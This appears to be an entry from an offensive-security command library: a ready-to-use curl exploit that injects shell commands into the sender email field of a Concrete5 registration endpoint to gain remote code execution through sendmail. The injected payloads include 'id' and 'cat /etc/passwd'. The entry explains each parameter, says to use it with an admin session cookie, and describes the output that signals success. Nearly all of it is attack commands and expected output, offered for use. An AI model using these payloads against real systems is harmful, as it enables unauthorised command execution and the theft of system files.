---
id: cmd-curl-sendmail-inject
data: >-
  curl -X POST 'http://target.com/concrete/tools/users/register' -d
  'sender=attacker@example.com; id #' -d 'other_form_fields=value' --cookie
  'concrete5_session=admin_session_token'
tags:
  - injection
  - rce
  - curl
type: command
output: >-
  HTML response with potential command output or error; check server logs for
  'uid=33(www-data)' indicating success
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:20.001Z'
verified: false
validated: true
submitted: true
---
# curl-sendmail-inject

## Command

```bash
curl -X POST 'http://target.com/concrete/tools/users/register' -d 'sender=attacker@example.com; id #' -d 'other_form_fields=value' --cookie 'concrete5_session=admin_session_token'
```

## Description

This curl command simulates submitting a malicious registration form to a Concrete5 instance, injecting a command into the sender email field to exploit sendmail for RCE. Use it when authenticated as admin to trigger the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method for form submission | Yes |
| `'http://target.com/...'` | Target endpoint for registration or email config | Yes |
| `-d 'sender=...'` | Sender field with injection payload (e.g., email; command #) | Yes |
| `-d 'other_form_fields=value'` | Additional required form data | Yes |
| `--cookie '...'` | Admin session cookie for authentication | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/login' -d 'username=admin&password=pass'
```

### Advanced Usage

```bash
curl -X POST 'http://target.com/concrete/tools/users/register' \
  -d 'sender=attacker@example.com; cat /etc/passwd #' \
  -d 'email= victim@test.com' \
  -d 'name=Test User' \
  --cookie 'concrete5_session=abc123' \
  -v
```

## Expected Output

Successful execution returns an HTTP response indicating form submission, potentially with injected command output in the body or headers. For the `id` payload, look for `uid=33(www-data) gid=33(www-data)` in server email logs or response if echoed.

## Related

- [[Related Procedure: Inject-Command-via-Sender-Email-for-RCE]]
